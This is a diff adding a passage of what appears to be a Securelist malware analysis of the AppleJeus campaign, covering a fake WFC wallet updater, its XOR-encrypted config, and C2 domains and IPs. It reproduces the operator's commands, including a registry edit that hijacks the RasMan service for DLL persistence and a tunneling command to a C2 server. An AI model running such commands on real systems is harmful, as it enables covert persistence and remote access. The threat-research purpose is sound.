@@ -1,0 +1,31 @@
+Change of Windows malware
+During our ongoing tracking of this campaign, we found that one victim was compromised by Windows AppleJeus malware in March
+2019. Unfortunately, we couldn’t identify the initial installer, but we established that the infection started from a malicious file named
+WFCUpdater.exe . At that time, the actor used a fake website: wfcwallet[.]com
+Fig. 1 Binary infection procedure used in WFCWallet case
+The actor used a multi-stage infection like before, but the method was different. The infection started from .NET malware, disguised
+as a WFC wallet updater (a9e960948fdac81579d3b752e49aceda). Upon execution, this .NET executable checks whether the
+command line argument is “/Embedding” or not. This malware is responsible for decrypting the WFC.cfg file in the same folder with a
+hardcoded 20-byte XOR key (82 d7 ae 9b 36 7d fc ee 41 65 8f fa 74 cd 2c 62 b7 59 f5 62). This mimics the wallet updater connected
+to the C2 addresses:
+wfcwallet.com (resolved ip: 108.174.195.134)
+www.chainfun365.com (resolved ip: 23.254.217.53)
+After that, it carries out the malware operator’s commands in order to install the next stage permanent payload. The actor delivered
+two more files into the victim’s system folder: rasext.dll and msctfp.dat . They used the RasMan (Remote Access Connection
+Manager) Windows service to register the next payload with a persistence mechanism. After fundamental reconnaissance, the
+malware operator implanted the delivered payload by manually using the following commands:
+cmd.exe /c dir rasext.dll
+cmd.exe /c dir msctfp.dat
+cmd.exe /c tasklist /svc | findstr RasMan
+cmd.exe /c reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RasMan\ThirdParty /v DllName /d
+rasext.dll /f
+In order to establish remote tunneling, the actor delivered more tools, executing with command-line parameters. Unfortunately, we
+have had no chance to obtain this file, but we speculate that Device.exe is responsible for opening port 6378, and the
+CenterUpdater.exe tool was used for creating tunneling to a remote host. Note that the 104.168.167.16 server is used as a C2 server.
+The fake website hosting server for the UnionCryptoTrader case will be described next.
+Port opener:
+%APPDATA%\Lenovo\devicecenter\Device.exe 6378
+Tunneling tool:
+https://securelist.com/operation-applejeus-sequel/95596/ 2/10
+1/14/2020 Operation AppleJeus Sequel | Securelist
+%APPDATA%\Lenovo\devicecenter\CenterUpdater.exe 127.0.0.1 6378 104.168.167.16 443
